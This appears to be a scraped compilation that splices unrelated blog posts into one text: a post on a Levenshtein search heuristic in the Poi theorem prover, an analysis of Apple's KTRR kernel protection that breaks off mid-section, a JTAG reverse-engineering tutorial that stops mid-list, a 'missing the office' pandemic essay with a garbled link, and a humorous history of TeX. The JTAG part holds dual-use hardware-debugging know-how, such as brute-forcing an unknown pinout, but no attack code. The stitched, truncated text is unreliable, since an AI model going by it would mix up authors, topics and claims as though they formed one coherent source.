<p>by Sven Nilsen, 2020</p>

<p><a href="https://crates.io/crates/poi">Poi 0.18</a> is released!</p>

<p>In this blog post I will discuss the new Levenshtein heuristic used in Poi.</p>

<p><img src="https://raw.githubusercontent.com/advancedresearch/advancedresearch.github.io/master/images/lev.png" alt="Levenshtein distance"></p>

<p><em>The Levenshtein distance measures minimum single-character changes between two strings.<br>
It is named after Vladimir Levenshtein, which considered this distance in 1965 (Source: <a href="https://en.wikipedia.org/wiki/Levenshtein_distance">Wikipedia</a>)</em></p>

<h3 id="why-automated-theorem-proving-is-hard">Why automated theorem proving is hard</h3>

<p>Automated theorem proving is hard for the same reason the boardgame chess is hard.</p>

<p><a href="https://en.wikipedia.org/wiki/Shannon_number">The Shannon number</a> is a conservative lower bound
of the game-tree complexity of chess: 10^120.
This is more than the number of atoms in the observable universe.</p>

<p>However, in automated theorem proving, the complexity is sometimes countable infinity.
With other words, if one tries to search the whole space of possible proofs, the program will run forever.</p>

<h3 id="heuristic-measurements">Heuristic measurements</h3>

<p>In order to prioritize search of possible proofs, one needs a heuristic.</p>

<p>Here, the word “heuristic” means the same as e.g. using utility to optimize course of action for AI agents.
In fact, an automated theorem prover is very much alike an AI agent, except there are no interactions with an environment.
The automated theorem prover usually lives in a world with “perfect information”, aka chess.
However, there is no opponent. Instead, the “opponent” is the complexity of math itself.</p>

<p>The following properties was desirable when choosing a heuristic measurement for Poi:</p>

<ul>
  <li>Reaches minimum value when reaching goal</li>
  <li>Smooth gradient when getting closer to the goal</li>
  <li>Rule agnostic</li>
  <li>Easy to maintain</li>
</ul>

<p>My first idea of how this heuristic should look like,
was something that used sub-expressions matching with the goal.</p>

<p>I was thinking about how difficult this would be to code.</p>

<p>Then, I realized that I was thinking too complicated: Why not use strings instead of expressions?</p>

<h3 id="levenshtein-distance">Levenshtein distance</h3>

<p><a href="https://en.wikipedia.org/wiki/Levenshtein_distance">The Levenshtein distance</a> is the minimum number of
single-character edits required to transform one string into another string.</p>

<p>For example:</p>

<div><div><pre><code>lev("a + b", "c + d") = 2
</code></pre></div></div>

<p>This is because you only need to replace <code>a</code> with <code>c</code> and <code>b</code> with <code>d</code> in the first string to get the second string.</p>

<p>The Levenshtein distance also allows adding and removing characters, but not swapping them.</p>

<p>At first sight, it might seem a bit hacky to use strings this way,
when we are talking about a theorem prover which uses complex expressions behind the scenes.</p>

<p>However: It satisfies all the properties I mentioned above!</p>

<p>For example, an alternative could be to use machine learning,
which would become gradually better at assisting the theorem prover over time.
In this case, you would probably use strings, bytes or numbers to feed the neural network.
Would you consider this to be a hacky solution too?</p>

<p>I am interested in hearing what people think about what they consider a hacky heuristic versus a more robust heuristic.</p>

<p>So, why not just use a simple string algorithm?
After thinking about this, I decided to go for it, because I could not figure out any rational reason to not do it.</p>

<h3 id="try-first-learn-afterwards">Try first, learn afterwards</h3>

<p>How did I figure out whether Levenshtein distance was the right heuristic to use?</p>

<p>I simply added <a href="https://crates.io/crates/levenshtein">levenshtein</a> to the Cargo.toml
and coded for a few hours: Turned out that it works pretty well.</p>

<p>It took a couple iterations to get it right.
At first, the algorithm just picked the minimum Levenshtein distance from unreduced equivalences.
This worked surprisingly well, but more testing revealed that this algorithm was not sound.</p>

<p>I ended up with using <code>std::collections::{BinaryHeap, HashSet}</code> instead,
picking the minimum Levenshtein distance across all sub-proofs found so far.
This algorithm fixes the soundness problem, but uses a lot of memory.</p>

<p>Only after getting it working, I learned more about the theory behind Levenshtein distance in detail.</p>

<h3 id="thoughts-about-the-design">Thoughts about the design</h3>

<p>Since Levenshtein is not very good at strings where substrings are swapped,
I believe it will perform less well on commutative operators.</p>

<p>However, I believe that using the normal exhaustive search up to some depth,
will resolve some of the issues with commutativity.</p>

<p>The problem is how to deal with large expressions and lots of commutative operators, e.g. addition.
In this case, increasing the depth of exhaustive search will lead to significant slowdown.</p>

<p>One approach to solving this problem, is to assist the automated theorem prover by designing proper utility rules.</p>

<p>This is something I am testing now, by designing worst-case proofs and doing some experiments.</p>

<h3 id="utility-rules">Utility rules</h3>

<p>Utility rules are rules that can be proved from existing rules, e.g.:</p>

<div><div><pre><code>x0 + x1 + x2 + x3 &lt;=&gt; x0 + x3 + x2 + x1;
</code></pre></div></div>

<p>The expression <code>x0 + x1 + x2 + x3</code> is constructed similarly to a linked list (sort of).</p>

<p>The left-most term <code>x0</code> functions as a “tail” that pattern matches anywhere in the expression.
Keeping the left-most term fixed on both sides makes it possible to manipulate the expression at any depth,
instead of manipulating only at the leafs.</p>

<p>This is important when there are long chains of commutative operators,
because it avoids transformations via tree-like structures, which requires many more steps.</p>

<p>Although you can in principle prove the same using <code>a + b &lt;=&gt; b + a</code> only,
the automated theorem prover can not look that many steps ahead to make a realistic estimate using the Levenshtein distance.</p>

<h3 id="future-improvements">Future improvements</h3>

<p>In one test run I am running while writing this blog post, Poi uses 500 MiB of memory.</p>

<p>I might replace <code>HashSet</code> with a <a href="https://en.wikipedia.org/wiki/Cuckoo_filter">Cuckoo filter</a> (an improved Bloom filter) in the future,
in order to lower memory usage.</p>

<p>Also, I would like a replacement for <code>BinaryHeap</code> which uses less memory.</p>

<p>Thinking a bit about <a href="https://en.wikipedia.org/wiki/Trie">Trie</a> or finite state machines, as in the <a href="https://crates.io/crates/fst">fst</a> crate.</p>

<p>The problem is, I need to pop the minimum sorted by some numeric key.</p>

<p>Basically, I want something behaving like <code>BinaryHeap</code>, but more efficient for strings.</p>

<p>A minor improvement in performance could be to reuse the cache used in the Levenshtein algorithm.</p>

<p>At this stage, I am mostly focusing on testing that things work,
but in the future I might be focusing to how long time it takes to complete the proof search.
I have not decided yet whether the REPL should have built-in benchmarks or whether the REPL code should be refactored for running external benchmarks.</p>

<p>Allegedly “Kernel Text Readonly Region”.</p>

<h3 id="introduction">Introduction</h3>

<p>This post tries to detail the mechanism used in Apple’s A10 chips and later to prevent modification of an iOS kernel at runtime.<br>
Older chips attempt to do this via a monitor program loaded in EL3, which is inherently flawed and bypassable though as detailed in <a href="https://xerub.github.io/ios/kpp/2017/04/13/tick-tock.html">“Tick Tock” by xerub</a>.</p>

<h3 id="notes">Notes</h3>

<p>On some sites you’ll see the term “memory-mapped registers” being thrown around. To avoid confusion I will not use that term, but instead:</p>
<ul>
  <li>“Register” to mean actual registers such as those accessed by the arm64 <code>msr</code> instruction. Each CPU core has its own copy of such registers, and the values held by them will be lost when the core goes to sleep.</li>
  <li>“MMIO” (memory-mapped I/O) to mean a portion of the physical address that can be used to interact with a device on the SoC. Like regular RAM, this is global to the entire SoC and does not lose its values when any core goes to sleep, as it is a separate device.</li>
</ul>

<p>Also note that code shown here will often have been shortened, expanding or removing macros that are assumed to be defined (<code>KERNEL_INTEGRITY_KTRR</code>, <code>MACH_BSD</code>, <code>__arm64__</code>) or not (<code>DEVELOPMENT</code>, <code>DEBUG</code>).</p>

<h3 id="primitives">Primitives</h3>

<p>Besides abandoning EL3 altogether (leaving only EL1 and EL0), A10 chips introduce two new hardware features that serve as the corner stones for KTRR:</p>

<ul>
  <li>“RoRgn”<br>
A piece of MMIO consisting of a “start”, “end” and “lock” fields. The “lock” field, when   written to, will lock down all three fields, i.e. prevent any modification of them. The start and end fields hold numbers of pages in DRAM, spanning up the RoRgn. Inside this region, the memory controller will reject any and all attempted writes.<br>
XNU has three macros to refer to them:
    <div><div><pre><code><span>#define rRORGNBASEADDR (*(volatile uint32_t *) (amcc_base + 0x7e4))
#define rRORGNENDADDR  (*(volatile uint32_t *) (amcc_base + 0x7e8))
#define rRORGNLOCK     (*(volatile uint32_t *) (amcc_base + 0x7ec))
</span></code></pre></div>    </div>
  </li>
  <li>“KTRR registers”<br>
A set of three registers added to every CPU core, holding “low”, “high” and “lock” values respectively. The lock register, again, locks all three down. The low and high registers hold physical addresses, spanning up the executable range. If the CPU is at EL1 and the MMU is turned on, then any instruction fetch (i.e. trying to execute memory) outside of that range will fail, even if it is marked as executable in the page table. If the CPU is at EL0 or if the MMU is turned off, this range has no effect.<br>
For those too, XNU has macros:
    <div><div><pre><code><span>#define ARM64_REG_KTRR_LOWER_EL1                        S3_4_c15_c2_3
#define ARM64_REG_KTRR_UPPER_EL1                        S3_4_c15_c2_4
#define ARM64_REG_KTRR_LOCK_EL1                         S3_4_c15_c2_2
</span></code></pre></div>    </div>
  </li>
</ul>

<p>Also it is worth mentioning another feature that was present in past chips already, but is set up differently now:</p>

<ul>
  <li>
    <p>“IORVBAR”<br>
A piece of MMIO holding one field for every CPU, designating the physical address at which it will start executing on “reset” (basically when waking from sleep). This too has a locking mechanism, which is activated by writing to it a value that as its least significant bit set to 1.<br>
On A9 CPUs and earlier this was set to a physical address inside TrustZone, where WatchTower (KPP) resides. Since A10, this is set to <code>LowResetVectorBase</code> as found in XNU, which iBoot calculates from the kernel’s entry point as outlined by this comment:</p>

    <div><div><pre><code><span>/*
 * __start trampoline is located at a position relative to LowResetVectorBase
 * so that iBoot can compute the reset vector position to set IORVBAR using
 * only the kernel entry point.  Reset vector = (__start &amp; ~0xfff)
 */</span>
</code></pre></div>    </div>
  </li>
</ul>

<h3 id="in-theory">In theory</h3>

<p>The above primitives are virtually unbreakable due to their locking mechanism, but do by themselves not protect a running kernel. In order to look at what else is needed, we have to look a potential attacks:</p>

<ol>
  <li>(Asserted:) The primitives need to actually uphold what they promise.</li>
  <li>It must be impossible for an attacker to disable any protections or choose to not enable them, thus they must be set up and locked down before the attacker can gain code execution.</li>
  <li>It must be impossible for an attacker to patch any data you consider critical, so all of it needs to be inside the RoRgn. This sounds obvious in theory, but in practise a bunch of critical things are easily overlooked.</li>
  <li>It must be impossible for an attacker to patch page tables that are used to map memory from the RoRgn, otherwise they can copy said memory to a writeable location and patch page tables to point there instead. Such page tables must thus be inside the RoRgn themselves.</li>
  <li>It must be impossible for an attacker to employ a custom page table hierarchy, so the translation table base register that maps the kernel’s half of the address space (<code>ttbr1_el1</code> in this case) must be unchangeable.</li>
  <li>It must be impossible for an attacker to patch or inject any executable memory, otherwise they could add the instruction <code>msr ttbr1_el1, x0</code> and gain the ability to change <code>ttbr1_el1</code>. Therefore the “executable range” must be a strict subset of the RoRgn.</li>
  <li>It must be impossible for an attacker to turn off the MMU, since when the MMU is off all pages are considered executable and an attacker could again inject <code>msr ttbr1_el1, x0</code>. The MMU status is controlled by the least significant bit of the register <code>sctlr_el1</code>, so said register must to be unchangeable as well during normal operation.</li>
  <li>It must be impossible for an attacker to gain code execution before the MMU is turned on (for afore mentioned reasons). Since a CPU starts out with the MMU turned off when it wakes from sleep, this means IORVBAR must point to memory within the RoRgn, and any code executed before the MMU is turned on must not have its control flow controlled by data outside the RoRgn.</li>
</ol>

<h3 id="in-practice">In practice</h3>

<p>So let’s examine how iOS implements all of the above:</p>

<ol>
  <li>
    <p>IORVBAR is the first primitive to be fully set up, done so by iBoot before it jumps to the kernel’s entry point. Loaded and locked down all in one go.<br>
RoRgn gets its start and end values set by iBoot as well, but is not locked down yet. This is necessary because a lot of the data that is later readonly actually needs one-time initialisation, which is done by the kernel itself. I’ll skip over most kernel bootstrapping here, but after setting up virtual memory and all const data including kexts, we arrive at <code>kernel_bootstrap_thread</code>, part of which reads:</p>

    <div><div><pre><code><span>machine_lockdown_preflight</span><span>();</span>

    <p>The first thing we’re interested in is <code>machine_lockdown_preflight</code>, which is just a wrapper around <code>rorgn_stash_range</code> that grabs the values computed by iBoot, translates them to physical addresses and stahes them in RoRgn memory for later:</p>

    <p>Next, <code>arm_vm_prot_finalize</code> patches page tables for the main kernel binary one last time before they become readonly, removing the writeable flag from all const and code regions.<br>
And then, right before <code>bsd_init</code> there is a call to <code>machine_lockdown</code>, which is a wrapper around <code>rorgn_lockdown</code>. This call seems to have been <code>#ifdef</code>‘ed out of public sources, but if we compare a few functions to some disassembly, it’s evident a call to <code>machine_lockdown</code> was inlined there:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src=""></p><p>To follow up on my <a href="https://wrongbaud.github.io/posts/stm-xbox-jtag/">last post</a> about SWD and hardware debugging, I wanted to do a deep dive into JTAG from a reverse-engineering perspective. The previous post received a lot of great feedback and it seems that people are interested in this topic, so I wanted to continue the series and expand upon another hardware debugging mechanism. For those who are unfamiliar, JTAG is a hardware level debugging mechanism that many embedded CPUs utilize, with this post I hope to explain how to approach JTAG from a reverse engineers perspective and provide some practical examples along the way.</p><h2 id="goals">Goals</h2><p>With this post, I hope to do the following:</p><ol><li>Explain how JTAG works</li><li>Demonstrate how to discover and utilize a JTAG port/interface on an unknown target</li><li>Provide an overview of some of the current OSS tools that can be used to interact with a JTAG interface</li><li>Utilize JTAG to extract firmware and debug a target</li></ol><p>Also, before I give an overview, I wanted to point out a few great resources for learning about JTAG</p><ul><li><a href="https://github.com/cyphunk/JTAGenum/wiki/Embedded-Analysis#jtag">Cyphunk’s Embedded Analysis Page</a></li><li><a href="https://www.fpga4fun.com/JTAG.html">FPGA4Fun JTAG Overview</a></li><li><a href="https://pdfs.semanticscholar.org/69ac/07f94832ceb4d2344c9c2d2bc8fc04e68124.pdf?_ga=2.81325524.238759085.1584580795-2049975628.1584580795">Blackbox JTAG Reverse Engineering</a></li></ul><h2 id="jtag-overview">JTAG Overview</h2><p>JTAG is a hardware interface that was developed to assist developers and testers with low level debugging. JTAG was originally developed for testing integrated circuits and more specifically, sampling IO pins on a target under test. This type of debugging interface allows engineers to test connections on PCBs without needing the probe the physical pin itself. The JTAG interface is controlled via the state machine outlined below:</p><p><img data-src="http://openocd.org/doc-release/doxygen/jtag-state-machine-large.png" alt="JTAG State Machine" src="http://openocd.org/doc-release/doxygen/jtag-state-machine-large.png"></p><p>One of the important things to remember about JTAG at this level is that it involves two registers, the instruction register, and the data register. To utilize these registers, the proper states in the above state machine must be entered using the following interface signals:</p><div><table><thead><tr><th>Line</th><th>Usage</th></tr></thead><tbody><tr><td>TMS</td><td>This pin is used to navigate and control the JTAG state machine</td></tr><tr><td>TDI</td><td>Input pin, used to write data to the target</td></tr><tr><td>TDO</td><td>Output pin, Used to read data back out from the target</td></tr><tr><td>TCK</td><td>Used to determine when data is sampled for all inputs and outputs</td></tr><tr><td>TRST (Optional)</td><td>This pin can be used to reset the state machine to the starting state</td></tr></tbody></table></div><p>The state machine is navigated using the TMS and TCK lines, while data is written to or read from via TDI and TDO respectively. TMS is sampled on the rising edge of TCK, meaning that the TMS line must be asserted before TCK is toggled to navigate through the state machine. Data is then shifted into the instruction register (IR) or data register (DR) depending on the state of the JTAG state machine. When an operation is completed (or after the update DR/IR phase) the resulting data can be <em>shifted</em> out of DR by entering the <code>Shift-DR</code> state. With these primitives in place, manufacturers can implement whatever features they wish over JTAG.</p><p>The JTAG standard treats IR and DR as shift registers, and due to this, multiple targets can be daisy-chained together.</p><p><img data-src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c9/Jtag_chain.svg/654px-Jtag_chain.svg.png" alt="JTAG Daisy Chain" src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c9/Jtag_chain.svg/654px-Jtag_chain.svg.png"></p><p>In a nutshell, JTAG defines a state machine that is navigated with a minimum of 4 signals. With this state machine in place, end users can write and read from two shift registers, IR and DR.</p><h3 id="jtag-registers">JTAG Registers</h3><p>JTAG utilizes two main registers, the instruction register, and the data register. The instruction register is used to determine what function the JTAG controller is about to carry out such as a memory read, or memory write for example. The data register is then used as an additional input to the instruction register, for the previous example, they may be used to provide an address to read from or write to. These registers can vary in size based on their function.</p><p>To write to a register one would perform the following steps, we’ll use the IR as an example:</p><ol><li>Enter <code>Test Logic Reset</code> state (TLR) (This can be done by asserting the <code>TMS</code> line and cycling <code>CLK</code> 5 times)</li><li>Enter <code>Select IR Scan</code> state</li><li>Enter <code>Capture IR</code> state</li><li>Enter <code>Shift IR</code> – This is where we load the data into IR from TDI</li><li>Enter <code>Exit IR</code> state</li><li>Enter <code>Update IR</code> state – This stage “latches” the value into IR.</li></ol><p>Following this, if there were no data registers required, the operation would be performed, and the result (if any) would be loaded into the data register to be shifted out. However, many instructions require a data register to be filled out as well before operating. In that case, once the data register is written to and updated, the operation will be performed and the result can be shifted out of the data register.</p><p>Some instructions do not require the DR to be loaded, for example, if we had loaded the <code>IDCODE</code> instruction into IR (1110b), this would load the processor’s IDCODE value into the data register for us to then clock out and read it on <code>TDO</code>. To read the result out of <code>TDO</code>, one would navigate to the <code>Shift-DR</code> state, and clock in 32 bits on <code>TDI</code>, this would cause the data in the data register to be shifted out on the <code>TDO</code> line. See the image below for a visual representation of what would happen if one loaded the IR with the <code>IDCODE</code> instruction</p><p><img data-src="https://www.embecosm.com/appnotes/ean5/images/jtag-architecture-2.png" alt="IDCODE Instruction" src="https://www.embecosm.com/appnotes/ean5/images/jtag-architecture-2.png"></p><p>It’s important to remember, that <code>IR</code> and <code>DR</code> can be thought of as shift registers, meaning that when we update them with new values, the old values are then shifted out on <code>TDO</code>.</p><p>The JTAG standard defines the following instruction registers:</p><ul><li><code>BYPASS</code><ul><li>This instruction connects <code>TDI</code> and <code>TDO</code></li><li>In the <code>Shift DR</code> state, data is transferred from <code>TDI</code> to <code>TDO</code> with a delay of one <code>TCK</code> cycle</li><li>0 is loaded into the data register during the <code>Capture DR</code> state</li><li>This can be used to determine how many devices are in a scan chain</li></ul></li><li><code>IDCODE</code><ul><li>When loaded the Device Code Id Register is selected as the serial path between TDI and TDO</li><li>In the Capture-DR state, the 32-bit device ID code is loaded into this shift section</li><li>In the Shift-DR state, this data is shifted out, least significant bit first</li></ul></li><li><strong>Core JTAG Concepts</strong><ul><li>The state machine is navigated with 4 signals: <code>TCK</code>,<code>TMS</code>,<code>TDO</code> and <code>TDI</code></li><li><code>TDI</code> is used to provide input, <code>TDO</code> is used for output</li><li>Using this state machine data can be shifted into the IR (<code>Shift IR</code>) and the DR (<code>Shift DR</code>)</li><li>The instruction register (<code>IR</code>) can be thought of as a function, and the data register (<code>DR</code>) can be considered the argument to that function</li><li>As data is shifted into <code>DR</code> and <code>IR</code>, the previous contents are shifted out on <code>TDO</code></li><li>Once data is shifted into these registers, an operation can be performed (entirely dependent on host implementation aside from a few reserved instructions)</li><li>Data is <em>read</em> out of the target by shifting it onto <code>TDO</code> from the data register in the <code>Shift DR</code> state.</li></ul></li></ul><p>So now that we have gone over how JTAG works at a low level, we should talk about why we might care about it, and how this interface can grant access to useful features for reverse engineers. One of the most commonly used applications of the JTAG interface is hardware-level debugging (hence the title of this post). This is implemented by the chip manufacturer, and can vary from chip to chip, however, one of the most common implementations of hardware-level debugging for ARM targets is <a href="http://infocenter.arm.com/help/topic/com.arm.doc.ddi0314h/DDI0314H_coresight_components_trm.pdf">ARM’s CoreSight Debug Interface</a>. This is the same implementation that we <a href="https://wrongbaud.github.io/stm-xbox-jtag/">communicated with over SWD in my last post</a>, only, in this case, the Debug Access Port is communicated with over JTAG. The specifics of the JTAG implementation can be <a href="https://static.docs.arm.com/ihi0031/c/IHI0031C_debug_interface_as.pdf">found here</a>. Luckily for us, some excellent OSS tools can be used to communicate with these ports - this post will focus on using OpenOCD.</p><p>OpenOCD takes care of utilizing the JTAG or SWD interface to grant the end-user various primitives that are provided by the debug interface exposed through the CoreSight DAP. The Coresight / DAP architecture is fairly complicated and too much to cover in this (already long) post, so I will potentially save that for another post</p><h2 id="jtag-for-reverse-engineers">JTAG for Reverse Engineers</h2><p>It’s extremely important to have a solid understanding of the protocol fundamentals when approaching something like this from a reverse engineer’s perspective. When reverse engineering hardware (or software) you want to have your ground truth covered since there are always infinite unknowns. These next few sections will go over how we can take advantage of our low-level knowledge of these protocols to assist us on our path to gaining access to hardware level debugging via JTAG. The first thing that we need to do is determine the pinout, and if the pins exposed allow access to the JTAG interface.</p><h3 id="determining-the-pinout">Determining the pinout</h3><p>JTAG signal lines are often grouped together, sometimes (if you’re extremely lucky!) you will see one of the following headers:</p><p><img data-src="https://elinux.org/images/4/48/Ti_arm_jtag.jpg" alt="JTAG Headers" src="https://elinux.org/images/4/48/Ti_arm_jtag.jpg"></p><p>If you find something like this however, it may not have the exact signal groupings, so we will discuss how to determine a pinout if one assumes it’s used for JTAG.</p><p>When reverse engineering something like this, you want to start with what you know. Since we know that most manufacturers at <em>least</em> implement <code>IDCODE</code> and <code>BYPASS</code> let’s talk about how we can take advantage of those two instructions.</p><p>If you have identified what you believe to be a potential JTAG header or pinout, but do not know the pins, we can use the behavior of these two registers to determine the pinout.</p><p>Since the <code>IDCODE</code> register is typically loaded as the default IR, one can test an assumed pinout by doing the following:</p><ol><li>Assign roles to potential output pins (TMS, TCK, etc)</li><li>Enter the <code>Test Logic Reset</code> state</li><li>Enter the <code>Select DR Scan</code>, <code>Capture DR</code>, <code>Shift DR</code></li><li>Clock 32 values on <code>TDI</code> and monitor <code>TDO</code> for a valid <code>IDCODE</code> value</li><li>Check the <code>IDCODE</code> value that you shifted out if it looks valid congratulations! Otherwise, reassign pins and repeat!</li></ol><p>In addition to taking advantage of the fact that the <code>IDCODE</code> register is often loaded into the IR by default, we can also utilize the fact that both the IR and DR behave as shift registers, so if we assume a common register length (32 bits often works) we can attempt to brute force the pinout by doing the following:</p><ol><li>Assign roles to potential output pins (TMS, TCK,etc)</li><li>Using these assumed values, enter the <code>Test Logic Reset</code> state</li><li>Enter the <code>Shift IR</code> state</li><li>Shift in a unique 32-bit value on <code>TDI</code></li><li>Continue to shift 1’s on <code>TDI</code> while monitoring for your unique pattern on TDO (be sure to do this as lease 32 times!).</li><li>If the pattern is discovered, congratulations! Otherwise, …</li></ol></div></div>

		<div><p>I went into my office yesterday for the first time in a few months to pick some stuff up. We got notified
a couple of days ago to get any personal property out of the office before Thanksgiving or else it'd be
thrown out, so I guess we're moving out of the office<sup id="fnref:moving-out"><a href="#fn:moving-out">1</a></sup>. It was a pretty eerie place to be; even now, 8
months later, most people haven't been back and it kind of looks like the entire office was abducted by aliens in
early March.</p>

<p>Despite how weird it is, I still miss working out of the office.</p>
<!-- more -->

<p>I miss having a clean delineation between "work" and "home".</p>
<p>I miss having copious desk space and a big monitor<sup id="fnref:house"><a href="#fn:house">2</a></sup>.</p>
<p>I miss the 48" TVs on the wall showing Grafana dashboards with key metrics so there was always ambient knowledge of
what was going on with the product.</p>
<p>I miss having meetings in conference rooms where you can see other people and have a giant whiteboard to sketch on.</p>
<p>I miss casual collaboration. Video chat is a poor substitute and Slack is a deeply irritating tool that combines the
worst aspects of synchronous and asynchronous communication.</p>
<p>I miss productivity! Our engineering productivity has fallen through the floor since COVID despite everyone
working longer and harder; I fundamentally do not think remote teams can <em>ever</em> be as productive as in-person teams.</p>
<p>I miss having my employer pay for electricity and heat and fast symmetric multi-gigabit Internet access instead of
shifting those costs to me.</p>
<p>I miss having a plethora of convenient and delicious options for take-out lunch! I miss the gyros and french fries
at <a href="https://www.ayolagreek.com/">Ayola</a>. I miss the chicken pesto sandwich at <a href="https://working-girls-cafe.square.site/">Working Girls'
Cafe</a>. I miss the chow mein and pork buns from <a href="https://yanksing.com/">Yank Sing</a>. I
miss the katsu curry from <a href="http://www.muraccis.com/">Muracci's</a>. I miss the curry burritos from <a href="https://www.curryupnow.com/">Curry Up

miss the $5 lunch specials from <a href="http://www.mehfilindian.com/">Mehfil</a>.</p>
<p>I miss the succession of friendly baristas at our <a href="https://www.yelp.com/biz/hermanos-coffee-juice-san-francisco">favorite coffee shop</a> who always knew our orders and put up with our banter.</p>
<p>I miss occasional after-work drinks at the <a href="https://sf.eater.com/2019/4/25/18516128/skydeck-spirits-in-the-sky-rooftop-bar-san-francisco">sky bar</a> with the $18 well drinks that we always convinced management to pay for.</p>
<p>Hell, I miss <a href="https://www.bart.gov/">BART</a> in all its loud and smelly glory.</p>
<p>Look, I know, it's not all bad. It's a lot easier taking care of a baby while working from home than it would be if
I were commuting 45 minutes each way every day. I'm spending a lot less money on food and coffee and BART. And I'm
not arguing that we should be in the office now; not a single one of those things I listed above is worth the health
risk of jamming 150 people<sup id="fnref:deniers"><a href="#fn:deniers">4</a></sup> into an open-plan office with a quasi-functional ventilation
system<sup id="fnref:ventilation"><a href="#fn:ventilation">3</a></sup>. But I
really hope that office-work isn't a permanent victim of this pandemic, that all the companies pushing for
permanent WFH to save a few bucks on rent reconsider their stances, and that there comes a time when I can go back to
work again.</p>

November 21, 2020 | https://yakshav.es/the-patron-saint-of-yakshaves/ | <a href="https://web.archive.org/web/*/https://yakshav.es/the-patron-saint-of-yakshaves/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>In 2015, I gave a talk in which I called <a href="https://speakerdeck.com/skade/tex-the-ultimate-yakshave">Donald Knuth the Patron Saint of Yak Shaves</a>. The reason is that Donald Knuth achieved the most perfect and long-running yak shave: TeX.</p>
<p>I figured this is worth repeating.</p>
<h2 id="how-to-achieve-the-ultimate-yak-shave">How to achieve the ultimate Yak Shave</h2>
<p>The ultimate yak shave is the combination of improbable circumstance, the privilege to be able to shave at your hearts will and the will to follow things through to the end. Here’s the way it was achieved with TeX. The recount is purely mine, inaccurate and obviously there for fun. I’ll avoid the most boring facts that everyone always tells, such as <a href="https://en.wikipedia.org/wiki/Knuth_reward_check">why Knuth’s checks have their own Wikipedia page</a>.</p>
<p>So, let’s get things started.</p>
<h2 id="the-pre-shave">The Pre-Shave</h2>
<p>TeX was invented to typeset a book. No plural. It was invented to typeset the second edition of “The Art of Computer Programming”. The second edition had to be typeset again, as “hot type” typesetting, which was used for the first edition, was not available anymore. Being unimpressed by the available options, Knuth decided to write his own system, which later ended up as TeX.</p>
<p>But “The Art of Computer Programming” is an impressive book in its own right: it is still unfinished, currently spanning 3.5 volumes (yes, the fourth is unfinished, but the first chapters are released). It was called a book of the century by <a href="https://web.archive.org/web/20080820030403/http://www.americanscientist.org/bookshelf/pub/100-or-so-books-that-shaped-a-century-of-science">American scientist writers</a>.</p>
<p>Yak shave -2: Write a book of the century</p>
<p>Digging deeper into TAOCP, it already shows the works of a yak shaver destined for greater things. All programs in this book refer to a common assembly language: MIX. Which was invented for the book.</p>
<p>Yak shave -1: Invent your own computer for illustration purposes</p>
<h2 id="implementation">Implementation</h2>
<p>The first version of TeX was implemented using the <a href="https://en.wikipedia.org/wiki/SAIL_(programming_language)">SAIL</a> programming language. It was later replaced by WEB. What’s WEB? It’s a programming language, invented by… You’ll have guessed it by now, Donald Knuth. It transpiles to PASCAL. Knuth transpiled the WEB before it was cool.</p>
<p>Yak shave 1: Somewhere along the road, implement your own programming language…</p>
<p>WEB is a special language: in WEB, any bare text is just text. It’s interleaved with marked pieces of code, which are later used for the program code. The documentation can be run through a special program to produce… a TeX file. The concept is called “literate programming” and was introduced by… Donald Knuth.</p>
<p>Yak shave 2: Invent your own programming paradigm for it</p>
<p>But, what does TeX do? Mainly, it does text layout and a couple of other things. Knuth being known for research on algorithms couldn’t do without coming up with his own algorithm, later published together with Michael Plass. What does the algorithm do? It finds a visually pleasing way to lay out a paragraph on a page without making line breaks look jarring (for example by adjusting the “glue”, the whitespace between words). Here’s a <a href="https://www.ugrad.cs.ubc.ca/~cs490/2015W2/lectures/Knuth.pdf">nice explanation</a>.</p>
<p>It’s still considered good and has a huge factor in the recognisable look of TeX documents.</p>
<p>Yak shave 3: Invent your own layout algorithm for it</p>
<p>Which brings us to the next problem: <em>what</em> does this thing lay out? Generically speaking: objects and clusters of objects of varying sizes. Interestingly, that’s what TeX deals with, it has no concept of a character other then dimensions.</p>
<p>Nevertheless, these are usually characters and characters are provided by fonts. Fonts must usually be licensed at a fee and free fonts weren’t so available in the 70s.</p>
<p>Another very recognisable feature of TeX documents that they are often set in a font called “Computer Modern”.</p>
<p>I’m trying to make this whole thing a bit more thrilling, so I will let you guess who created that one.</p>
<p>Yak shave 4: Design a font</p>
<p>Fonts need to be authored. Usually, they are described in some vector description, often Bézier curves. This is fairly standard and not an innovation of Knuth. <em>But</em>, he wrote a description language for that, along with an interpreter to turn this descriptions into proper font files. This is <a href="https://en.wikipedia.org/wiki/Metafont">METAFONT</a>. It’s not strictly part of TeX, it’s just that the Yak happened to stand close.</p>
<p>Yak shave 5: Write an authoring tool for fonts</p>
<p>As a side-note, METAFONT was later evolved into METAPOST for generic vector drawings, which has the one feature I still miss from many modern graphics description languages: the ability to describe an (addressable) point as the intersection between two other primitives.</p>
<p>Another side-note: both TeX and METAFONT still see releases, at a slow pace. TeX is currently at version 3.14159265, METAFONT at 2.7182818. Yep, TeX is slowly converging towards pi, while METAFONT towards e. Take that, semantic versioning advocates!</p>
<p>Yak shave 6: Come up with your own versioning scheme<br>
Yak shave 7: Avoid adoption of it for greater good</p>
<p>We’re not done yet. We can layout text (and other things), but where do we convert it to? Now, everyone knows the horror printers invoke, so no one wants to deal with those directly. Classic TeX instead converts things to <a href="https://en.wikipedia.org/wiki/Device_independent_file_format">DVI</a>, the “device independent” format. I don’t know many details about it, except what’s on the wiki page, which feels the need to specifically point out that “DVI is not a document encryption format”. It is again a stack-based language (in contrast to PostScript not turing complete), which can then be interpreted through a driver, which would then send that to whatever target (a printer, PDF or such). It was designed by…</p>
<p>David R. Fuchs, Knuth just wrote the implementation.</p>
<p>Yak shave 8: Implement a custom language for printable documents</p>
<p>Note that I haven’t mentioned that TeX is an… interesting… language by itself, but I don’t consider that a yak shave, this was just the implementation.</p>
<p>That makes most of the initial implementation complete. Which means, in orderly fashion, you should give matters in the hand of the community.</p>

<p>Since the release of TeX, the community has been busy working on using it as a platform. If you ever downloaded the full TeX distribution, please bear in mind that you are downloading the amassed work of over 40 years, to make sure that each and every TeX document ever written builds. We’re talking about documents here.</p>
